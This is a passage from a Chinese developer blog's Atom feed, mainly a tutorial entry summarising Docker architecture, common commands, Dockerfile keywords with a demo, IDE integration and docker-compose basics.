tea</a></p><p><ahref="https://gobook.io/read/gitea.com/xorm/manual-zh-CN/chapter-01/index.html">|(gobook.io)</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这篇继续学习Beego框架，主要学习一下Beego自带的的&lt;strong&gt;ORM&lt;/strong&gt;框架，并学习其他的ORM框架如&lt;strong&gt;XORM&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/Beego学习-ORM/33c2806b5f91142b652527c3edafc114.jpeg&quot; alt=&quot;33c2806b5f91142b652527c3edafc114&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Go语言" scheme="https://lzwgiter.github.io/tags/Go%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Go Web" scheme="https://lzwgiter.github.io/tags/Go-Web/"/>
    
  </entry>
  
  <entry>
    <title>docker-compose及dockerfile总结</title>
    <link href="https://lzwgiter.github.io/posts/a9031312.html"/>
    <id>https://lzwgiter.github.io/posts/a9031312.html</id>
    <published>2021-07-06T03:37:26.000Z</published>
    <updated>2023-02-14T12:35:14.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原来虽然也用用docker，但一直都局限于docker pull、dockerrun完事，没有细致的去了解docker的运行机制以及docker-compose、dockerfile的编写等等，所以如何快速构建镜像、同时部署多个容器这一块始终是空白，这篇主要来填补一下这块空白。</p><figure><img src="/img/docker-compose及dockerfile总结/logo.jpeg" alt="logo" /><figcaption aria-hidden="true">logo</figcaption></figure></blockquote><span id="more"></span><h2 id="docker">Docker</h2><h3 id="docker作用及特点">docker作用及特点</h3><p>docker官网的文档是这么描述docker这个技术的：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Docker provides the ability to package and run an application in a loosely isolated environment called a container. The isolation and security allow you to run many containers simultaneously on a given host. Containers are lightweight and contain everything needed to run the application, so you do not need to rely on what is currently installed on the host. You can easily share containers while you work, and be sure that everyone you share with gets the same container that works in the same way.</span><br></pre></td></tr></table></figure><p>所以docker的核心是容器<code>container</code>，这些容器之间独立且都运行在本地主机<code>host</code>之上，并且这种容器非常便于分享、启停。安装也很简单，windows这里一般不用，一般都是Linux系统，直接<code>apt-get</code>就行了，可以配置配置镜像加速源，就可以使用了。官方文档也给出了三个主要的应用场景：</p><ul><li>一次性的环境，便于分享应用</li><li>弹性的云服务，得益于容器便于管理</li><li>便于组建微服务</li></ul><p>你让我来说的话，其实排除掉你自己的应用(jar、war、go什么的)，其实就俩部分：<code>image</code>和<code>container</code>，这俩的关系是这样的<code>image -&gt; container</code>，<strong>即容器是从镜像来的，构建镜像的过程就是在为你的应用添加依赖、添加环境配置的过程，镜像构建好了是静态的，而容器是动态的，按照你构建好的镜像来创建一个动态的容器，并对这个容器做一些隔离(端口等)，留出一些可以访问这个容器的途径，就可以使用这个容器了。</strong></p><h3id="docker整体架构以及本地网络架构">docker整体架构以及本地网络架构</h3><p>docker属于cs架构，我们一般好像都是本地直接命令docker不拉不拉不拉，实际上docker分为了<code>docker client</code>和<code>docker server</code>，所以你也可以去连接一个远程主机上的docker服务，来进行镜像和容器的管理。整体结构如下图：</p><figure><img src="/img/docker-compose及dockerfile总结/architecture.svg"alt="architecture" /><figcaption aria-hidden="true">architecture</figcaption></figure><p>本地来看的话，一般会有以下网卡出现：</p><p><img src="/img/docker-compose及dockerfile总结/image-20210709222453866.png" alt="image-20210709222453866" style="zoom:80%;" /></p><h3 id="常见命令">常见命令</h3><blockquote><p>查看当前docker的环境配置变量</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看client以及server的状态、配置（硬件、目录信息、镜像和容器、镜像源等等）、</span></span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><blockquote><p>搜索镜像</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询指定名称的镜像</span></span><br><span class="line">docker search [name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如查询nginx：docker search nginx</span></span><br></pre></td></tr></table></figure><blockquote><p>拉取指定的镜像</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取指定的名称:tag的镜像，你可以设定镜像源，官方地址：https://hub.docker.com</span></span><br><span class="line">docker pull [name]:[tag]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如docker pull ubuntu:18.04</span></span><br></pre></td></tr></table></figure><blockquote><p>查看当前仓库的所有镜像、查看镜像构建信息(包括基本信息(作者、父镜像等)、构建信息(EntryPoint、环境变量等))</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">list</span></span><br><span class="line">docker images</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看镜像构建信息</span></span><br><span class="line">docker inspect [ID]</span><br></pre></td></tr></table></figure><blockquote><p>查看当前docker所有的容器(包括活动的、停止的)</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">两个命令都可以</span></span><br><span class="line">docker ps -a</span><br><span class="line">docker container ls -a</span><br></pre></td></tr></table></figure><blockquote><p>删除镜像</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rmi [ID]or[name:tag]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如docker rmi xxxxx或者docker rmi ubuntu:18.04</span></span><br></pre></td></tr></table></figure><blockquote><p>删除容器</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm [ID]</span><br></pre></td></tr></table></figure><blockquote><p>为一个镜像重新打标签</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果出现依赖问题时，有时可能是tag导致的问题，比如拉取[name]:v1.4但是实际上镜像源只有[name]:1.4</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先拉取这个需要的镜像</span></span><br><span class="line">docker pull xxxx:[old_tag]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新打tag</span></span><br><span class="line">docker tag xxxx:[old_tag] xxxx:[new_tag]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除原有镜像</span></span><br><span class="line">docker rmi xxxx:[old_tag]</span><br></pre></td></tr></table></figure><h2 id="dockerfile">Dockerfile</h2><p>什么是Dockerfile？其实就是个文本文件，通过docker定义的几个关键字来描述你的需求，即可以通过文本来构建一个符合你需求的镜像，并依据这个镜像构造容器来搭建环境，达到<strong>快速部署、利于迭代</strong>的特点。</p><p>也可以把自己的应用比如jar包、war包啥的写入Dockerfile，构建你自己应用的镜像，并上传到公开仓库里供别人使用。这里明确Dockerfile的目标是<strong>生成镜像而非生成容器</strong>。</p><h3 id="如何编写dockfile">如何编写Dockfile</h3><p>首先我们来看一下常用的关键字及其含义：</p><table><colgroup><col style="width: 7%" /><col style="width: 46%" /><col style="width: 46%" /></colgroup><thead><tr class="header"><th>关键字名称</th><th>关键字含义</th><th>例子及其释义</th></tr></thead><tbody><tr class="odd"><td>FROM</td><td>基础镜像</td><td>FROM ubunu:18.04 -- 以ubuntu作为基础镜像进行改造</td></tr><tr class="even"><td>MAINTAINER</td><td>维护者信息</td><td>MAINTAINER float<a href="mailto:test@test.com"class="email">test@test.com</a></td></tr><tr class="odd"><td>RUN</td><td>在基础镜像基础上运行指定的命令</td><td>RUN apt-get install wget git</td></tr><tr class="even"><td>CMD</td><td>相当于RUN，但是运行时间点不一样</td><td></td></tr><tr class="odd"><td>ENTRYPOINT</td><td>类似CMD指令，但是不会被dockerrun的命令行所覆盖，并且这些命令行参数会被当做参数送给该指令指定的程序</td><td>ENTRYPOINT ["app.jar","8080"]，当然你也可以配合CMD命令来使用，使其为ENTRYPOINT传递可变参数ENTRYPOINT["nginx","-c"] CMD["/etc/nginx/nginx.conf"]若执行<code>docker run nginx:test -c /etc/nginx/new.conf</code>则会容器会执行<code>nginx:test -c /etc/nginx/new.conf</code></td></tr><tr class="even"><td>COPY</td><td>将当前上下文目录中的文件复制到容器里面去</td><td>COPY --chown=float:root ./app.jar可以使用<code>--chown &lt;user&gt;:&lt;group&gt;</code>来指定该文件的拥有者和属组</td></tr><tr class="odd"><td>ADD</td><td>和COPY类似，但是有优点：1.源文件为tar，且压缩个事为gzip、bzip2、xz情况下会自动复制并解压到目标路径</td><td>ADD app.jar /home/float/app.jar</td></tr><tr class="even"><td>WORKDIR</td><td>相当于cd命令</td><td>WORKDIR /home/float 切换到指定目录</td></tr><tr class="odd"><td>USER</td><td>相当于su <username>，切换后续命令的执行用户</td><td>USER float 后续命令将使用float用户来执行</td></tr><tr class="even"><td>VOLUME</td><td>定义匿名数据卷，启动容器时忘记挂载数据卷，会自动挂载到匿名卷。匿名数据卷可以防止容器逐渐变大、保护重要数据被重启影响</td><td>VOLUME /opt/app_cache 格式：VOLUME <路径>，可以使用</td></tr><tr class="odd"><td>EXPOSE</td><td>声明端口，让看这个文件的人知道这个服务的守护端口是什么，但是运行的时候会随机映射，除非你手动指定</td><td>EXPOSE 8080但是实际到主机是一个任意的端口，需要你自己去指定，这个关键字知识让你知道8080是守护端口</td></tr><tr class="even"><td>ONBUILD</td><td>当前Dockerfile构建的镜像如果被集成到其他 DockerFile 的时候就会运行ONBUILD 的指令，触发指令</td><td>ONBUILD <其他指令></td></tr><tr class="odd"><td>ENV</td><td>设置环境变量，后续指令中就可以使用这个变量了</td><td>ENV JAVA_HOME=/usr/local/jvm/jdk1.8.0_271/</td></tr><tr class="even"><td>ARG</td><td>构建参数，作用于与ENV不通，只在当前Dockerfile中生效</td><td>ARG PORT=8080 格式：ARG <参数名>[=<默认值>]</td></tr></tbody></table><h3 id="一个demo">一个Demo</h3><p>这个Demo没啥价值，但是也展示了如何进行Dockerfile的编写以及构建镜像，假设该文件名为ubuntuTest</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgiter&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义环境变量</span></span><br><span class="line"><span class="keyword">ENV</span> APTPATH /etc/apt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换地址</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$APTPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -a /etc/apt/sources.list /etc/apt/sources.list.bak</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s@http://.*archive.ubuntu.com@http://repo.huaweicloud.com@g&quot;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s@http://.*security.ubuntu.com@http://repo.huaweicloud.com@g&quot;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;END&quot;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>构建命令： docker build -f ubuntuTest -t myubuntu:0.1 .</p></blockquote><p><strong>这里有一个需要注意的点：dockerbuild命令的格式是这样的：Usage: docker build [OPTIONS] PATH | URL |-</strong>，上面那个构建命令最后的<code>.</code>即当前目录指的就是在build命令执行时的上下文目录，如果你需要使用到COPY命令的话这个参数是非常重要的，错误的上下会会导致找不到需要的文件。</p><figure><imgsrc="/img/docker-compose及dockerfile总结/image-20210808120831016.png"alt="image-20210808120831016" /><figcaption aria-hidden="true">image-20210808120831016</figcaption></figure><h3id="在idea中使用golandpycharm等同理">在IDEA中使用(GoLand、PyCharm等同理)</h3><p>新版本已经不需要手动去安装Docker插件了，没有的话自行在Pugins里安装。这里我用SpringCloud的Eureka做Demo，代码很简单不做展示，主要说明流程。首先在项目根目录下创建Dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/Eureka-1-0.0.1-SNAPSHOT.jar Eureka-1.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;Eureka-1.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>然后我们在<code>File | Settings | Build, Execution, Deployment | Docker</code>中添加我们的Docker服务器：</p><figure><imgsrc="/img/docker-compose及dockerfile总结/image-20210810151857295.png"alt="image-20210810151857295" /><figcaption aria-hidden="true">image-20210810151857295</figcaption></figure><p>我这里使用的是本地windows的DockerDesktop，你也可以使用Linux下的，红框处直接配置就可以了。然后我们在项目的<code>Run/Debug Configuration</code>中添加Docker的执行方法：</p><figure><imgsrc="/img/docker-compose及dockerfile总结/image-20210810152240025.png"alt="image-20210810152240025" /><figcaption aria-hidden="true">image-20210810152240025</figcaption></figure><p>红框处可以调整我们的构建参数、运行参数，然后最下面的<code>Command preview</code>中可以预览即将执行的命令。Apply后我们运行就可以看到自动的根据我们的Dockerfile构建镜像、创建容器、启动容器：</p><figure><imgsrc="/img/docker-compose及dockerfile总结/image-20210810153513632.png"alt="image-20210810153513632" /><figcaption aria-hidden="true">image-20210810153513632</figcaption></figure><p>可以看到成功的部署并且运行了，我们可以看一下docker中的信息：</p><figure><imgsrc="/img/docker-compose及dockerfile总结/image-20210810153737315.png"alt="image-20210810153737315" /><figcaption aria-hidden="true">image-20210810153737315</figcaption></figure><p>可以看到正在运行中的容器以及我们构建好的镜像。</p><h2 id="docker-compose">docker-compose</h2><p>Ok，那上面说了Dockerfile了，方便吧？其实有更方便的，那就是docker-compose。这俩啥区别嘞？</p><p>你想想，Dockerfile是通过构建镜像-&gt;手动生成容器来进行工作的，那为啥不能把这两步直接合并，我直接docker-compose就能起来容器了多好？那这就是docker-compose的作用了，他的目标是<strong>容器</strong>，而非Dockerfile的目标<strong>镜像</strong>。</p><p>此外，扩展一下，如果你的环境不止一个镜像呢？每个镜像一个Dockerfile去构建，然后每次用的时候一个个手动创建容器？这也是个问题，而docker-compose就可以帮助你解决这个问题，通过编写docker-compose.yml文件来管理多个镜像、构造容器，实现一键启动环境。</p><h3 id="如何使用docker-compose">如何使用docker-compose</h3><p>首先我们需要下载docker-compose，下面的项目主页里二进制版本也可以，或者就是使用pip来安装。下面也列出了官方详细的教程供学习。</p><ul><li>官方项目主页：<ahref="https://github.com/docker/compose">docker/compose: Define and runmulti-container applications with Docker</a></li><li>官方教程：<a href="https://docs.docker.com/compose/">Overview ofDocker Compose | Docker Documentation</a></li></ul><p>推荐使用pip的方式安装，比较方便：</p><blockquote><p>更新pip: python3 -m pip install --upgrade pip</p><p>安装docker-compose: python3 -m pip install docker-compose (Python&gt;= 3.6)</p></blockquote><p>docker-compose的命令十分简单，常用的就两个(在项目路径下)</p><ul><li>docker-compose up -- 创建并启动容器</li><li>docker-compose down -- 停止并删除容器</li></ul><p>通常上docker-compose流程需要三步：</p><p>当然其那面也说了，docker-compose是配合你的dockerfile来进行工作的，实现多镜像多容器的自动管理。所以重头戏是怎么写<code>docker-compose.yml</code>这个文件，那我们接下来就看一下如何编写。</p><h3 id="如何编写docker-compose.yml">如何编写docker-compose.yml</h3><p>由于docker-compose由多个小单元构成(我这里指的单元就是service)，所以我们先直接来看一个官方的例子迅速了解一下docker-compose.yml如何编写：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.8&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;5000:5000&quot;</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">.:/code</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">logvolume01:/var/log</span></span><br><span class="line">        <span class="attr">links:</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">redis</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">    <span class="attr">logvolume01:</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom: 67%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;原来虽然也用用docker，但一直都局限于docker pull、docker
run完事，没有细致的去了解docker的运行机制以及docker-compose、dockerfile的编写等等，所以如何快速构建镜像、同时部署多个容器这一块始终是空白，这篇主要来填补一下这块空白。&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/img/docker-compose及dockerfile总结/logo.jpeg&quot; alt=&quot;logo&quot; /&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;logo&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="docker" scheme="https://lzwgiter.github.io/tags/docker/"/>
    
  </entry>
  
</feed>
